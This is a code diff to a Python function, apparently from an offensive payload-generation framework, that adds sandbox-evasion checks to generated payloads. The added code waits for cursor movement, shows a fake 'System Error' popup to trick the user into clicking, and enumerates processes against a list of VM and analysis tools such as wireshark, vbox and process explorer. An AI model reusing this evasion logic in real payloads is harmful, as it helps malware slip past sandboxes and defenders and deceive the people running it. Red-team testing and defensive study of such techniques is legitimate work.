@@ -115,6 +115,52 @@ def senecas_games(evasion_payload):
             # Add a tab for this check
             num_tabs_required += 1
 
+        if evasion_payload.required_options["CURSORMOVEMENT"][0].lower() != "false":
+
+            seconds = evasion_helpers.randomString()
+            x_position = evasion_helpers.randomString()
+            y_position = evasion_helpers.randomString()
+            x2_position = evasion_helpers.randomString()
+            y2_position = evasion_helpers.randomString()
+
+            check_code += '\t' * num_tabs_required + 'from time import sleep\n'
+            check_code += '\t' * num_tabs_required + 'import win32api\n'
+            check_code += '\t' * num_tabs_required + seconds + ' = 30\n'
+            check_code += '\t' * num_tabs_required + x_position + ', ' + y_position + ' = win32api.GetCursorPos()\n'
+            check_code += '\t' * num_tabs_required + 'sleep(30)\n'
+            check_code += '\t' * num_tabs_required + x2_position + ', ' + y2_position + ' = win32api.GetCursorPos()\n'
+            check_code += '\t' * num_tabs_required + 'if ' + x_position + ' - ' + x2_position + ' != 0 or ' + y_position + ' - ' + y2_position + ' != 0:\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+
+        if evasion_payload.required_options["USERPROMPT"][0].lower() != "false":
+
+            popup_title = evasion_helpers.randomString()
+            popup_message = evasion_helpers.randomString()
+            message_box = evasion_helpers.randomString()
+
+            check_code += '\t' * num_tabs_required + 'import ctypes\n'
+            check_code += '\t' * num_tabs_required + popup_title + ' = "System Error 0x18463832"\n'
+            check_code += '\t' * num_tabs_required + popup_message + ' = "Your system encountered an error, please click OK to proceed"\n'
+            check_code += '\t' * num_tabs_required + message_box + ' = ctypes.windll.user32.MessageBoxW\n'
+            check_code += '\t' * num_tabs_required + message_box + '(None, ' + popup_message + ', ' + popup_title + ', 0)\n'
+            check_code += '\t' * num_tabs_required + 'if True:\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+
+        if evasion_payload.required_options["SANDBOXPROCESS"][0].lower() != "false":
+
+            sandbox_exist = evasion_helpers.randomString()
+            bad_procs = evasion_helpers.randomString()
+            current_processes = evasion_helpers.randomString()
+
+            check_code += '\t' * num_tabs_required + 'import win32pdh\n'
+            check_code += '\t' * num_tabs_required + sandbox_exist + ' = []\n'
+            check_code += '\t' * num_tabs_required + bad_procs + ' = "vmsrvc", "tcpview", "wireshark", "visual basic", "fiddler", "vmware", "vbox", "process explorer", "autoit", "vboxtray", "vmtools", "vmrawdsk", "vmusbmouse", "vmvss", "vmscsi", "vmxnet", "vmx_svga", "vmmemctl", "df5serv", "vboxservice", "vmhgfs"\n'
+            check_code += '\t' * num_tabs_required + '_, ' + current_processes + ' = win32pdh.EnumObjectItems(None,None,\'process\', win32pdh.PERF_DETAIL_WIZARD)\n'
+
         if evasion_payload.required_options["UTCCHECK"][0].lower() != "false":
 
             time_import = evasion_helpers.randomString()
